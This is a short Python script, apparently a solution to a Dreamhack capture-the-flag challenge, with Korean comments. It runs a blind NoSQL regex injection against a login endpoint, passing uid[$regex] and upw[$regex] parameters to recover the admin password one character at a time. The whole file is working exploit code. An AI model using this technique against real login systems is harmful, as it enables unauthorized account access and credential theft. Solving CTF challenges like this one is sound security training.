import requests, string

HOST = "http://host3.dreamhack.games:23435"
ALPHANUMERIC = string.digits + string.ascii_letters
SUCCESS = 'admin'

flag = ''

for i in range(32): # 32에 numeric이라고 문제에서 주어짐
    for ch in ALPHANUMERIC:
        response = requests.get(f'{HOST}/login?uid[$regex]=ad.in&upw[$regex]=D.{{{flag}{ch}') #f"" format에서는 중괄호 쌍 사이에 변수를 넣었을 때 그 값을 문자열 안에 위치시키는 특징이 있음
        if response.text == SUCCESS:
            flag += ch
            # print(ch)
            break
            
print(f'FLAG: DH{{{flag}}}')
